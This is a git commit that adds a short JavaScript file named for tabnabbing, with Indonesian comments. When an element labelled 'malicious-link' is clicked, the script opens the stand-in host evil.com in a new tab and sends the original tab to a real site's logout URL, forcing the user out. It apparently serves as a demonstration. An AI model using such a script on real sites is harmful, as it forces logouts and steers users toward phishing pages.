18192e40e37aa37b92d902dc8e5a120aca21f63c
satbalsusid <satbalsusid@gmail.com>
2024-12-01 09:06:42 -0800

    Add files via upload

---
+++ tabnabbbing-javascript.js
@@ -0,0 +1,10 @@
+document.getElementById('malicious-link').addEventListener('click', function (event) {
+    // Mencegah tautan default
+    event.preventDefault();
+
+    // Membuka tab baru ke URL jahat
+    window.open('https://evil.com', '_blank');
+
+    // Memaksa logout di tab sumber
+    window.location.href = 'https://www.codepolitan.com/logout/';
+});
